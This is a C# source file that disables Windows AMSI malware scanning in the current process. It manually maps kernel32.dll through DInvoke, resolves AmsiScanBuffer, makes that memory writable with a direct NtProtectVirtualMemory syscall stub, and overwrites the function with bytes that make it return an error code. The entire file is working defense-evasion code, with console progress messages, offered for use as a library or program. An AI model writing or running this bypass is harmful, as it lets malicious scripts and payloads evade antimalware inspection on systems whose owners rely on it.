using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Patch
{
    public class bySyscall
    {

        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DInvoke.Native.NTSTATUS NtProtectVirtualMemory(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    ref IntPtr RegionSize,
    uint NewProtect,
    ref uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr LoadLib(string name);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] 
        delegate IntPtr GProcAddr(IntPtr hModule, string procName);

        public static void Patch()
        {
            if (is64Bit())
                ChangeBytes(x64);
            else
                ChangeBytes(x86);
        }

        private static void ChangeBytes(byte[] patch)
        {
            try
            {

                // library to load
                object[] LoadLibparams =
                {
                    "amsi.dll"
                };

                /* If Kernel32 Mapping fails:
                
                Console.WriteLine("[>] Parsing _PEB_LDR_DATA structure of kernel32.dll \n");
                // Parsing _PEB_LDR_DATA structure of kernel32.dll
                IntPtr pkernel32 = DInvoke.DynamicGeneric.GetPebLdrModuleEntry("kernel32.dll");

                // Get LoadLibraryA Address
                var pLoadLibrary = DInvoke.DynamicGeneric.GetExportAddress(pkernel32, "LoadLibraryA");


                // Actually Call LoadLibraryA for the function mentioned above
                var lib = (IntPtr)DInvoke.DynamicGeneric.DynamicFunctionInvoke(pLoadLibrary, typeof(LoadLib), ref LoadLibparams);


                Console.WriteLine("[>] Process Handle : " + string.Format("{0:X}", lib.ToInt64()) + "\n");
                
                
                
                */
                Console.WriteLine("[>] Manually mapping kernel32.dll into current process memory \n");

                DInvoke.PE.PE_MANUAL_MAP moduleDetails = DInvoke.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
                Console.WriteLine("\n[>] Module Base : " + string.Format("{0:X}", moduleDetails.ModuleBase.ToInt64()) + "\n");

                // Call LoadLibraryA for the lib from above
                var lib = (IntPtr)DInvoke.DynamicGeneric.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA", typeof(LoadLib), LoadLibparams);
                Console.WriteLine("[>] Process Handle : " + string.Format("{0:X}", lib.ToInt64()) + "\n");

                //Remove the above if kernel32 mapping fails
                
                // Function to patch
                object[] GetProcAddressparams =
                {
                    lib,
                    "AmsiScanBuffer"
                };

                // Parsing _PEB_LDR_DATA structure of kernel32.dll
                IntPtr pkernel32 = DInvoke.DynamicGeneric.GetPebLdrModuleEntry("kernel32.dll");
                
                // Get GetProcAddress Address
                var pLoadLibrary = DInvoke.DynamicGeneric.GetExportAddress(pkernel32, "GetProcAddress");

                // Actually Call GetProcAddress for the function mentioned above
                var addr = (IntPtr)DInvoke.DynamicGeneric.DynamicFunctionInvoke(pLoadLibrary, typeof(GProcAddr), ref GetProcAddressparams);

                Console.WriteLine("[>] Patch address : " + string.Format("{0:X}", addr.ToInt64()) + "\n");

                uint oldProtect = 0;

                // NtProtectVirtualMemory Syscall
                IntPtr stub = DInvoke.DynamicGeneric.GetSyscallStub("NtProtectVirtualMemory");
                NtProtectVirtualMemory NtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));


                Process thisproc = Process.GetCurrentProcess();
                
                // Save value of addr as this is increased by NtProtectVirtualMemory
                IntPtr oldaddress = addr;
                
                var regionSize = (IntPtr)patch.Length;
                oldProtect = 0;

                var result = NtProtectVirtualMemory(
                thisproc.Handle,
                ref addr,
                ref regionSize,
                0x40,
                ref oldProtect);

                if (result == 0)
                {
                    Console.WriteLine("[+] NtProtectVirtualMemory success, going to patch it now!\n");
                }
                else
                {
                    Console.WriteLine("[-] NtProtectVirtualMemory failed :-(\n");
                    Console.WriteLine("[-] Error code: " + result + "\n");
                }


                Console.WriteLine("[>] Patching at address : " + string.Format("{0:X}", oldaddress.ToInt64()) + "\n");

                Marshal.Copy(patch, 0, oldaddress, patch.Length);

                

                regionSize = (IntPtr)patch.Length;
                uint newoldProtect = 0;

                // CleanUp permissions back to oldprotect

                result = NtProtectVirtualMemory(
                thisproc.Handle,
                ref oldaddress,
                ref regionSize,
                oldProtect,
                ref newoldProtect);

                if (result == 0)
                {
                    Console.WriteLine("[+] NtProtectVirtualMemory set back to oldprotect!\n");
                }
                else
                {
                    Console.WriteLine("[-] NtProtectVirtualMemory to restore oldprotect failed.\n");
                    Console.WriteLine("[-] Error code: " + result + "\n");
                }
                

            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }
        
        // If you don't want a Library but a console application
        //public static void Main(string[] args)
        //{
        //    Patch();
        //}

     
        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
    }

}
